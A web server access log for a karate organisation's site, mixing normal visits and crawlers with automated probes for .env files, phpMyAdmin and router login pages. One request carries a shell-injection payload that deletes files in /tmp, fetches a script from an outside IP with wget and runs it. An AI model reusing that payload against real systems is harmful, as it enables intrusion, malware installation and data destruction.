::ffff:109.237.98.226 - - [19/Jun/2023:00:11:32 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:194.26.196.72 - - [19/Jun/2023:18:19:04 +0000] "GET /db/myadmin/index.php?lang=en HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:194.26.196.72 - - [19/Jun/2023:18:19:05 +0000] "GET /phpmyadmin2016/index.php?lang=en HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:194.26.196.72 - - [19/Jun/2023:18:19:05 +0000] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 404 164 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:194.26.196.72 - - [19/Jun/2023:18:19:05 +0000] "GET /mysql/dbadmin/index.php?lang=en HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:194.26.196.72 - - [19/Jun/2023:18:19:05 +0000] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:51.89.5.185 - - [19/Jun/2023:18:27:40 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.89.5.185 - - [19/Jun/2023:18:27:41 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:87.121.221.234 - - [19/Jun/2023:18:31:05 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:194.169.175.37 - - [19/Jun/2023:18:38:43 +0000] "GET /repeater.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)"
::ffff:135.125.246.110 - - [19/Jun/2023:18:50:28 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [19/Jun/2023:18:50:28 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:43.157.24.213 - - [19/Jun/2023:19:03:37 +0000] "GET / HTTP/1.1" 200 57394 "-" "python-requests/2.31.0"
::ffff:45.79.171.66 - - [19/Jun/2023:19:03:53 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:43.155.118.219 - - [19/Jun/2023:19:14:17 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:46.225.248.11 - - [19/Jun/2023:19:16:55 +0000] "GET / HTTP/1.0" 200 57394 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::ffff:185.254.196.173 - - [19/Jun/2023:19:17:00 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [19/Jun/2023:19:17:01 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:167.94.138.50 - - [19/Jun/2023:19:17:40 +0000] "GET / HTTP/1.1" 200 57394 "-" "-"
::ffff:167.94.138.50 - - [19/Jun/2023:19:17:40 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.138.50 - - [19/Jun/2023:19:17:40 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.94.138.50 - - [19/Jun/2023:19:17:41 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.138.50 - - [19/Jun/2023:19:17:41 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:157.55.39.225 - - [19/Jun/2023:19:26:29 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:52.167.144.98 - - [19/Jun/2023:19:26:39 +0000] "GET /sitemap.txt HTTP/1.1" 404 150 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:52.167.144.98 - - [19/Jun/2023:19:26:39 +0000] "GET /sitemap.txt HTTP/1.1" 404 150 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:66.249.66.86 - - [19/Jun/2023:19:46:51 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.86 - - [19/Jun/2023:19:46:51 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.90 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:35.203.211.22 - - [19/Jun/2023:19:57:44 +0000] "GET / HTTP/1.1" 200 57394 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:45.79.171.66 - - [19/Jun/2023:20:10:29 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:129.114.108.70 - - [19/Jun/2023:20:26:38 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 152 "-" "python-requests/2.27.1"
::ffff:43.155.118.219 - - [19/Jun/2023:20:31:41 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:84.17.47.110 - - [19/Jun/2023:20:38:46 +0000] "GET / HTTP/1.0" 200 57394 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 OPR/55.0.2994.44"
::ffff:84.17.47.110 - - [19/Jun/2023:20:38:47 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 OPR/55.0.2994.44"
::ffff:84.17.47.110 - - [19/Jun/2023:20:38:47 +0000] "GET /?err=error HTTP/1.0" 200 57946 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 OPR/55.0.2994.44"
::ffff:45.79.171.66 - - [19/Jun/2023:20:39:10 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:107.77.213.235 - - [19/Jun/2023:20:42:43 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:42:43 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:42:44 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:42:44 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:42:44 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:42:44 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:42:44 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:42:44 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:42:44 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:42:44 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:42:44 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:42:44 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:42:44 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:42:44 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:42:44 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:42:48 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:42:51 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:42:58 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:43:02 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:43:09 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:107.77.213.235 - - [19/Jun/2023:20:44:01 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:216.244.66.196 - - [19/Jun/2023:20:51:13 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:167.94.145.58 - - [19/Jun/2023:20:51:53 +0000] "GET / HTTP/1.1" 200 57394 "-" "-"
::ffff:167.94.145.58 - - [19/Jun/2023:20:51:54 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.145.58 - - [19/Jun/2023:20:51:54 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.94.145.58 - - [19/Jun/2023:20:51:54 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.145.58 - - [19/Jun/2023:20:51:55 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:135.125.246.110 - - [19/Jun/2023:20:53:03 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [19/Jun/2023:20:53:03 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:216.244.66.196 - - [19/Jun/2023:20:53:39 +0000] "GET /videos.html HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:89.32.241.148 - - [19/Jun/2023:21:00:09 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+95.214.27.201/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:66.249.66.12 - - [19/Jun/2023:21:00:53 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:213.32.122.82 - - [19/Jun/2023:21:01:04 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
::ffff:66.249.66.69 - - [19/Jun/2023:21:02:29 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.67 - - [19/Jun/2023:21:02:29 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.90 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:205.210.31.17 - - [19/Jun/2023:21:10:43 +0000] "GET / HTTP/1.0" 200 57394 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:45.79.171.66 - - [19/Jun/2023:21:13:56 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:45.79.171.66 - - [19/Jun/2023:21:13:56 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:45.79.171.66 - - [19/Jun/2023:21:13:56 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:45.79.171.66 - - [19/Jun/2023:21:13:56 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:45.79.171.66 - - [19/Jun/2023:21:13:57 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:45.79.171.66 - - [19/Jun/2023:21:14:01 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:45.79.171.66 - - [19/Jun/2023:21:14:03 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:24 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:24 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:24 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:24 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:24 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:25 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:25 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:26 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:27 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "python-requests/2.27.1"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:27 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:27 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/contact" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:27 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/contact" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:29 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:29 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/contact?s=1&ss=5" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:29 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/contact?s=1&ss=5" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:30 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:31 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/contact?s=1&ss=3" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:31 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/contact?s=1&ss=3" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:32 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:32 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/contact?s=1&ss=8" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:32 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/contact?s=1&ss=8" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:34 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:34 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/contact?s=1&ss=4" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:34 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/contact?s=1&ss=4" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.13.114 - - [19/Jun/2023:21:14:36 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
